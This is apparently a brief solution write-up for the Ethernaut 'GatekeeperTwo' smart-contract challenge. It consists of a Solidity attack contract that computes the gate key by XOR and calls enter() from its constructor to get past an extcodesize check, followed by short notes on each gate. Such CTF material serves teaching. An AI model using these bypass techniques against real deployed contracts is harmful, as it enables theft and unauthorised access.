```javascript
contract GatekeeperTwoAttack {
    constructor (address addr) public {
        bytes8 gate_key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1));
        (bool success, ) = addr.call(abi.encodeWithSignature("enter(bytes8)", gate_key));
        require(success);
    }
}
```

Gate 1 is just a simple `tx.origin` trick.
Gate 2 requires us to put the attack in the constructor so that `extcodesize(caller()) == 0`.
Gate 3 just requires us to calculate the key, which can be done by the inverse property of the XOR operator.